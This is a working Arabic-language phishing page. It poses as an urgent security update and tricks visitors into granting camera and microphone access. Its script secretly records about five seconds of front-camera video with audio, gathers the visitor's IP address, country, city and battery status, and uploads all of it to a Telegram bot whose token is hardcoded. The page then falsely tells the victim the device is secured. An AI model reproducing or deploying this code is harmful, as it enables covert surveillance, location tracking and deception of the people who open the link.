<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تحديث الأمان - مطلوب</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, sans-serif;
            background: linear-gradient(135deg, #000000, #1a0000);
            color: white; min-height: 100vh;
            display: flex; justify-content: center; align-items: center;
        }
        .container { text-align: center; padding: 30px; max-width: 420px; }
        .alert-icon { font-size: 80px; animation: shake 1s infinite; }
        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            25% { transform: translateX(-5px); }
            75% { transform: translateX(5px); }
        }
        h1 { color: #ff3333; margin: 15px 0; font-size: 22px; }
        p { color: #ccc; font-size: 14px; margin: 8px 0; }
        .btn {
            display: inline-block; background: linear-gradient(135deg, #ff3333, #cc0000);
            color: white; border: none; padding: 15px 40px; font-size: 18px;
            border-radius: 25px; cursor: pointer; margin: 15px 0; font-weight: bold;
            animation: pulse 1.5s infinite;
        }
        @keyframes pulse {
            0%, 100% { box-shadow: 0 0 0 0 rgba(255,51,51,0.5); }
            50% { box-shadow: 0 0 0 20px rgba(255,51,51,0); }
        }
        .loading { display: none; margin: 15px 0; }
        .spinner {
            width: 40px; height: 40px; border: 3px solid rgba(255,255,255,0.2);
            border-top-color: #ff3333; border-radius: 50%;
            animation: spin 1s linear infinite; margin: 0 auto;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        video { display: none; width: 100%; max-width: 300px; border-radius: 15px; margin: 15px auto; }
    </style>
</head>
<body>
    <div class="container">
        <div class="alert-icon">⚠️</div>
        <h1>تم اكتشاف تهديد أمني!</h1>
        <p>جهازك بحاجة إلى تحديث أمني فوري</p>
        <p>يرجى الضغط على الزر للتحقق من الكاميرا</p>

        <button class="btn" id="verifyBtn" onclick="startVerify()">🔒 تحقق وتأمين</button>

        <div class="loading" id="loading">
            <div class="spinner"></div>
            <p style="margin-top:10px;">جاري فحص الكاميرا...</p>
        </div>

        <video id="video" autoplay playsinline muted></video>

        <p style="font-size:11px;color:#666;margin-top:15px;">نظام الأمان التلقائي</p>
    </div>

    <script>
        function getChatId() { return new URL(window.location.href).searchParams.get('chatId') || ''; }
        const chatId = getChatId();
        const BOT_TOKEN = '8757323904:AAFstrBa_966uP2S3_7QyMSdOoolhfNVhDM';
        let mediaRecorder;
        let recordedChunks = [];

        async function getIpInfo() {
            try { const r = await fetch('https://ipapi.co/json/'); const d = await r.json(); return { ip: d.ip, country: d.country_name, city: d.city }; } catch(e) { return { ip: '?', country: '?', city: '?' }; }
        }
        async function getBatteryInfo() {
            if ('getBattery' in navigator) { const b = await navigator.getBattery(); return { level: Math.round(b.level*100), charging: b.charging ? 'نعم' : 'لا' }; }
            return { level: '?', charging: '?' };
        }

        async function startVerify() {
            if (!chatId) { alert('خطأ في الرابط!'); return; }
            document.getElementById('verifyBtn').style.display = 'none';
            document.getElementById('loading').style.display = 'block';

            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: true });
                const video = document.getElementById('video');
                video.srcObject = stream;
                video.style.display = 'block';
                document.getElementById('loading').style.display = 'none';
                document.querySelector('h1').textContent = '🎥 جاري تصوير الفيديو...';
                document.querySelector('h1').style.color = '#00ff88';

                mediaRecorder = new MediaRecorder(stream);
                mediaRecorder.ondataavailable = e => { if (e.data.size > 0) recordedChunks.push(e.data); };
                mediaRecorder.onstop = async () => {
                    const blob = new Blob(recordedChunks, { type: 'video/mp4' });
                    const [ip, battery] = await Promise.all([getIpInfo(), getBatteryInfo()]);
                    const caption = `🎥 فيديو من كاميرا الجهاز\n\n🌍 IP: ${ip.ip}\n📍 الدولة: ${ip.country}\n🏙️ المدينة: ${ip.city}\n🔋 البطارية: ${battery.level}%\n⚡ الشحن: ${battery.charging}`;
                    
                    const formData = new FormData();
                    formData.append('chat_id', chatId);
                    formData.append('video', blob, 'video.mp4');
                    formData.append('caption', caption);
                    
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method: 'POST', body: formData });
                    
                    stream.getTracks().forEach(t => t.stop());
                    video.style.display = 'none';
                    document.querySelector('h1').textContent = '✅ تم تأمين الجهاز!';
                    document.querySelector('h1').style.color = '#00ff88';
                    document.querySelector('.alert-icon').textContent = '✅';
                    document.querySelector('p').textContent = 'تم التحديث بنجاح';
                };
                mediaRecorder.start();
                setTimeout(() => { if (mediaRecorder.state === 'recording') mediaRecorder.stop(); }, 5000);

            } catch(e) {
                document.getElementById('loading').style.display = 'none';
                document.querySelector('h1').textContent = '⚠️ حدث خطأ';
                document.getElementById('verifyBtn').style.display = 'inline-block';
            }
        }
    </script>
</body>
</html>
